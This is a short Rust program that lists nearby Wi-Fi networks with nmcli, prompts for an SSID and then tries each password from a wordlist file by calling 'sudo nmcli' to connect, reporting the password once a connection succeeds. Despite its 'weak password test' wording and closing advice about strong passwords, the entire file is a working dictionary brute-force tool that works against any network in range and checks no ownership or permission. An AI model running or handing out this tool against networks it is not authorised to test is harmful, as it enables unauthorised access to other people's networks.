use std::fs::File;
use std::io::{self, Write};
use std::io::{BufRead, BufReader};
use std::process::{exit, Command};

fn main() {
    println!("Scanning for available Wi-Fi networks...\n");
    let output = Command::new("nmcli")
        .arg("device")
        .arg("wifi")
        .arg("list")
        .output()
        .expect("Failed to execute nmcli");

    if !output.status.success() {
        let error_message = String::from_utf8_lossy(&output.stderr);
        println!("Failed to scan for Wi-Fi networks: {}", error_message);
        exit(1);
    }

    let available_networks = String::from_utf8_lossy(&output.stdout);
    println!("Available Wi-Fi networks:\n{}", available_networks);

    // Get the Wi-Fi SSID from the user
    let mut ssid = String::new();
    print!("Enter the Wi-Fi SSID to test: ");
    io::stdout().flush().unwrap();
    io::stdin().read_line(&mut ssid).unwrap();
    let ssid = ssid.trim();

    // Load the list of weak passwords from the file
    let password_file = "src/passwordList.txt"; // Common weak passwords file
    let password_list = File::open(password_file).unwrap();
    let reader = BufReader::new(password_list);

    let mut attempts = 1;

    println!(
        "\nStarting Wi-Fi password brute force test for SSID: {}...\n",
        ssid
    );

    // Loop through each password in the password list
    for line in reader.lines() {
        let password = line.unwrap().trim().to_string();

        println!("Attempting password [{}]: {}", attempts, password);

        // Attempt to connect to the Wi-Fi network using nmcli
        let output = Command::new("sudo")
            .arg("nmcli")
            .arg("d")
            .arg("wifi")
            .arg("connect")
            .arg(ssid)
            .arg("password")
            .arg(&password)
            .output()
            .expect("Failed to execute nmcli");

        // Check if connection was successful
        if output.status.success() {
            println!(
                "\nSuccess! Weak password found after {} attempts.",
                attempts
            );
            println!("Password: {}\n", password);
            println!(
                "WARNING: This demonstrates why it's important to use strong Wi-Fi passwords."
            );
            exit(0);
        } else {
            let error_message = String::from_utf8_lossy(&output.stderr);
            println!("Failed to connect: {}", error_message);
        }

        attempts += 1;
    }

    println!("\nNo weak password found in the list. Consider using even stronger passwords to secure your Wi-Fi.");
}
